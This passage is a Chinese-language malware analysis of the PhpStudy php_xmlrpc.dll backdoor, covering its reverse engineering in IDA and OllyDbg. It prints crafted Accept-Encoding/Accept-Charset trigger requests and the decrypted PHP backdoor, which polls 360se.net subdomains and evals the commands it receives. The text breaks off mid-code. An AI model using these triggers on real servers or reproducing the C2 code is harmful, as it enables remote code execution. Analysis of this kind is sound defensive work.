<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="phpstudy-后门非官方后门"><span class="csDE05BCC">Phpstudy </span><span class="csECDA2D3">后门（非官方后门！！！）</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Phpstudy 2016</span></p><p class="cs3A447A38"><span class="cs9FB05234">php\php-5.2.17\ext\php_xmlrpc.dll</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">php\php-5.4.45\ext\php_xmlrpc.dll</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Phpstudy 2018 </span><span class="cs9C1B1871">的</span><span class="cs8926E06">php-5.2.17</span><span class="cs9C1B1871">、</span><span class="cs8926E06">php-5.4.45</span></p><p class="cs3A447A38"><span class="cs9FB05234">PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h2 class="cs868C439D">
			<a name="分析过程"><span class="cs83F14626">分析过程</span></a></h2>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">1</span><span class="cs9C1B1871">、定位特征字符串位置</span></li><li class="cs24C36B3"><span class="cs8926E06">2</span><span class="cs9C1B1871">、静态分析传参数据</span></li><li class="cs24C36B3"><span class="cs8926E06">3</span><span class="cs9C1B1871">、动态调试构造传参内容</span></li></ul>
		<h3 class="cs868C439D">
			<a name="php_xmlrpcdll"><span class="csD1E291E2">php_xmlrpc.dll</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">PHPstudy 2018</span><span class="cs9C1B1871">与</span><span class="cs8926E06">2016</span><span class="cs9C1B1871">两个版本的里的</span><span class="cs8926E06">PHP5.2</span><span class="cs9C1B1871">与</span><span class="cs8926E06">PHP5.4</span><span class="cs9C1B1871">版本里的恶意</span><span class="cs8926E06">php_xmlrpc.dll</span><span class="cs9C1B1871">一致。</span></p><h4 class="cs868C439D">
			<a name="定位特征字符串位置"><span class="cs6EDCDAE2">定位特征字符串位置</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06">@eval()</span><span class="cs9C1B1871">这个代码执行函数定位到引用位置。</span><span class="cs8926E06">@</span><span class="cs9C1B1871">是</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">提供的错误信息屏蔽专用符号。</span><span class="cs8926E06">Eval()</span><span class="cs9C1B1871">可执行</span><span class="cs8926E06">php</span><span class="cs9C1B1871">代码，中间</span><span class="cs8926E06">%s</span><span class="cs9C1B1871">格式符为字符串传参。函数地址为：</span><span class="cs8926E06">0x100031F0</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpstudy/Phpstudy%20%e5%90%8e%e9%97%a8%ef%bc%88%e9%9d%9e%e5%ae%98%e6%96%b9%e5%90%8e%e9%97%a8%ef%bc%81%ef%bc%81%ef%bc%81%ef%bc%89_files/image0.jpg" width="560" height="227" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图</span><span class="cs8926E06">1</span><span class="cs9C1B1871">：</span><span class="cs8926E06">eval</span><span class="cs9C1B1871">特征代码</span></p><h4 class="cs868C439D">
			<a name="静态分析传参数据"><span class="cs6EDCDAE2">静态分析传参数据</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">通过</span><span class="cs8926E06">F5</span><span class="cs9C1B1871">查看代码，分析代码流程，判断条件是有全局变量且有</span><span class="cs8926E06">HTTP_ACCEPT_ENCODING</span><span class="cs9C1B1871">的时候进入内部语句。接下来有两个主要判断来做正向连接和反向连接的操作。主要有两个部分。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第一部分，正向连接：判断</span><span class="cs8926E06">ACCEPT_ENCODING</span><span class="cs9C1B1871">如果等于</span><span class="cs8926E06">gzip,deflate</span><span class="cs9C1B1871">，读取</span><span class="cs8926E06">ACCEPT_CHARSE</span><span class="cs9C1B1871">的内容做</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">解密，交给</span><span class="cs8926E06">zend_eval_strings()</span><span class="cs9C1B1871">函数可以执行任意恶意代码。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">构造</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">头，把</span><span class="cs8926E06">Accept-Encoding</span><span class="cs9C1B1871">改成</span><span class="cs8926E06">Accept-Encoding: gzip,deflate</span><span class="cs9C1B1871">可以触发第一个部分。</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /index.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&hellip;..</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip,deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Charset:cHJpbnRmKG1kNSgzMzMpKTs=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&hellip;.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二部分，反向连接：判断</span><span class="cs8926E06">ACCEPT_ENCODING</span><span class="cs9C1B1871">如果等于</span><span class="cs8926E06">compress,gzip</span><span class="cs9C1B1871">，通过关键部分</span><span class="cs8926E06">@eval(gzuncompress(&#39;%s&#39;));</span><span class="cs9C1B1871">可以看到拼接了一段恶意代码，然后调用</span><span class="cs8926E06">gzuncompress</span><span class="cs9C1B1871">方法执行解密。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">构造</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">头，把</span><span class="cs8926E06">Accept-Encoding</span><span class="cs9C1B1871">改成</span><span class="cs8926E06">Accept-Encoding: compress,gzip</span><span class="cs9C1B1871">可以触发第二部分。</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /index.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&hellip;..</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding:compress,gzip</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&hellip;.</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpstudy/Phpstudy%20%e5%90%8e%e9%97%a8%ef%bc%88%e9%9d%9e%e5%ae%98%e6%96%b9%e5%90%8e%e9%97%a8%ef%bc%81%ef%bc%81%ef%bc%81%ef%bc%89_files/image1.jpg" width="560" height="293" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图</span><span class="cs8926E06">2</span><span class="cs9C1B1871">：第</span><span class="cs8926E06">1</span><span class="cs9C1B1871">部分流程判断代码</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpstudy/Phpstudy%20%e5%90%8e%e9%97%a8%ef%bc%88%e9%9d%9e%e5%ae%98%e6%96%b9%e5%90%8e%e9%97%a8%ef%bc%81%ef%bc%81%ef%bc%81%ef%bc%89_files/image2.jpg" width="560" height="395" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图</span><span class="cs8926E06">3</span><span class="cs9C1B1871">：第</span><span class="cs8926E06">2</span><span class="cs9C1B1871">部分流程判断代码</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这一部分有两处会执行</span><span class="cs8926E06">zend_eval_strings</span><span class="cs9C1B1871">函数代码的位置。分别是从</span><span class="cs8926E06">1000D66C</span><span class="cs9C1B1871">到</span><span class="cs8926E06">1000E5C4</span><span class="cs9C1B1871">的代码解密：</span></p><p class="cs3A447A38"><span class="cs9FB05234">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">error_reporting(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function tcpGet($sendMsg = &#39;&#39;, $ip = &#39;360se.net&#39;, $port = &#39;20123&#39;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$result = &quot;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$handle = stream_socket_client(&quot;tcp://{$ip}:{$port}&quot;, $errno, $errstr,10); </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if( !$handle ){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$handle = fsockopen($ip, intval($port), $errno, $errstr, 5);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if( !$handle ){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &quot;err&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;fwrite($handle, $sendMsg.&quot;\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(!feof($handle)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stream_set_timeout($handle, 2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result .= fread($handle, 1024);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info = stream_get_meta_data($handle);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($info[&#39;timed_out&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;fclose($handle); </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return $result; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$ds = array(&quot;www&quot;,&quot;bbs&quot;,&quot;cms&quot;,&quot;down&quot;,&quot;up&quot;,&quot;file&quot;,&quot;ftp&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ps = array(&quot;20123&quot;,&quot;40125&quot;,&quot;8080&quot;,&quot;80&quot;,&quot;53&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$n = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">do {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$n = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foreach ($ds as $d){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$b = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($ps as $p){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result = tcpGet($i,$d.&quot;.360se.net&quot;,$p); </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($result != &quot;err&quot;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$b =true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($b)break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$info = explode(&quot;&lt;^&gt;&quot;,$result);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (count($info)==4){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (strpos($info[3],&quot;/*Onemore*/&quot;) !== false){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info[3] = str_replace(&quot;/*Onemore*/&quot;,&quot;&quot;,$info[3]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$n=true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@eval(base64_decode($info[3]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}while($n);</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpstudy/Phpstudy%20%e5%90%8e%e9%97%a8%ef%bc%88%e9%9d%9e%e5%ae%98%e6%96%b9%e5%90%8e%e9%97%a8%ef%bc%81%ef%bc%81%ef%bc%81%ef%bc%89_files/image3.jpg" width="560" height="413" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从</span><span class="cs8926E06">1000D028 </span><span class="cs9C1B1871">到</span><span class="cs8926E06">1000D66C</span><span class="cs9C1B1871">的代码解密：</span></p><p class="cs3A447A38"><span class="cs9FB05234">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">error_reporting(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$h = $_SERVER[&#39;HTTP_HOST&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$p = $_SERVER[&#39;SERVER_PORT&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$fp = fsockopen($h, $p, $errno, $errstr, 5);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if (!$fp) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out = &quot;GET {$_SERVER[&#39;SCRIPT_NAME&#39;]} HTTP/1.1\r\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out .= &quot;Host: {$h}\r\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out .= &quot;Accept-Encoding: compress,gzip\r\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out .= &quot;Connection: Close\r\n\r\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fwrite($fp, $out);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fclose($fp);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpstudy/Phpstudy%20%e5%90%8e%e9%97%a8%ef%bc%88%e9%9d%9e%e5%ae%98%e6%96%b9%e5%90%8e%e9%97%a8%ef%bc%81%ef%bc%81%ef%bc%81%ef%bc%89_files/image4.jpg" width="560" height="343" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
			<a name="动态调试构造传参内容"><span class="cs6EDCDAE2">动态调试构造传参内容</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">OD</span><span class="cs9C1B1871">动态调试传参值需要对</span><span class="cs8926E06">httpd.exe</span><span class="cs9C1B1871">进程进行附加调试，</span><span class="cs8926E06">phpstudy</span><span class="cs9C1B1871">启用的</span><span class="cs8926E06">httpd</span><span class="cs9C1B1871">进程有两个。一个是带有参数的，一个是没有带参数的。在下断的时候选择没有参数的</span><span class="cs8926E06">httpd.exe</span><span class="cs9C1B1871">下断才能触发后门。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据前面</span><span class="cs8926E06">IDA</span><span class="cs9C1B1871">静态分析得到的后门函数地址，</span><span class="cs8926E06">OD</span><span class="cs9C1B1871">附加进程后从</span><span class="cs8926E06">httpd.exe</span><span class="cs9C1B1871">调用的模块里找到</span><span class="cs8926E06">php_xmlrpc.dll</span><span class="cs9C1B1871">模块，在</span><span class="cs8926E06">DLL</span><span class="cs9C1B1871">空间里定位后门函数地址</span><span class="cs8926E06">0x100031F0</span><span class="cs9C1B1871">，可能还需要手动修改偏移后下断点。使用</span><span class="cs8926E06">burpsuite</span><span class="cs9C1B1871">，构造</span><span class="cs8926E06">Accept-Encoding</span><span class="cs9C1B1871">的内容。发包后可以动态调试。建立触发点的虚拟机快照后可以反复跟踪调试得到最终可利用的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpstudy/Phpstudy%20%e5%90%8e%e9%97%a8%ef%bc%88%e9%9d%9e%e5%ae%98%e6%96%b9%e5%90%8e%e9%97%a8%ef%bc%81%ef%bc%81%ef%bc%81%ef%bc%89_files/image5.jpg" width="560" height="228" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图</span><span class="cs8926E06">4</span><span class="cs9C1B1871">：</span><span class="cs8926E06">OD</span><span class="cs9C1B1871">动态调试</span><span class="cs8926E06">Payload</span></p><h4 class="cs868C439D">
			<a name="php脚本后门分析"><span class="csBF12A472">PHP</span><span class="cs6EDCDAE2">脚本后门分析</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">脚本一功能：使用</span><span class="cs8926E06">fsockopen</span><span class="cs9C1B1871">模拟</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">发包</span></p><p class="cs3A447A38"><span class="cs9FB05234">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">error_reporting(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$h = $_SERVER[&#39;HTTP_HOST&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$p = $_SERVER[&#39;SERVER_PORT&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$fp = fsockopen($h, $p, $errno, $errstr, 5);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if (!$fp) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out = &quot;GET {$_SERVER[&#39;SCRIPT_NAME&#39;]} HTTP/1.1\r\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out .= &quot;Host: {$h}\r\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out .= &quot;Accept-Encoding: compress,gzip\r\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out .= &quot;Connection: Close\r\n\r\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fwrite($fp, $out);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fclose($fp);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">脚本二功能：</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">内置有域名表和端口表，批量遍历然后发送数据。注释如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">error_reporting(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function tcpGet($sendMsg = &#39;&#39;, $ip = &#39;360se.net&#39;, $port = &#39;20123&#39;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$result = &quot;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$handle = stream_socket_client(&quot;tcp://{$ip}:{$port}&quot;, $errno, $errstr,10); &nbsp;// </span><span class="cs7FFD2630">接收数据，每次过来一条数据就要连接一次</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if( !$handle ){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$handle = fsockopen($ip, intval($port), $errno, $errstr, 5); &nbsp;//</span><span class="cs7FFD2630">错误的时候就重连一次测试。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if( !$handle ){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &quot;err&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fwrite($handle, $sendMsg.&quot;\n&quot;); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">模拟发送数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(!feof($handle)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stream_set_timeout($handle, 2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result .= fread($handle, 1024); &nbsp;&nbsp;// </span><span class="cs7FFD2630">读取文件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info = stream_get_meta_data($handle); &nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">超时则退出</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($info[&#39;timed_out&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fclose($handle);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $result;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$ds = array(&quot;www&quot;,&quot;bbs&quot;,&quot;cms&quot;,&quot;down&quot;,&quot;up&quot;,&quot;file&quot;,&quot;ftp&quot;); &nbsp;&nbsp;// </span><span class="cs7FFD2630">域名表</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ps = array(&quot;20123&quot;,&quot;40125&quot;,&quot;8080&quot;,&quot;80&quot;,&quot;53&quot;); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">端口表</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$n = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">do {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$n = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foreach ($ds as $d){ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">遍历域名表</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$b = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($ps as $p){ 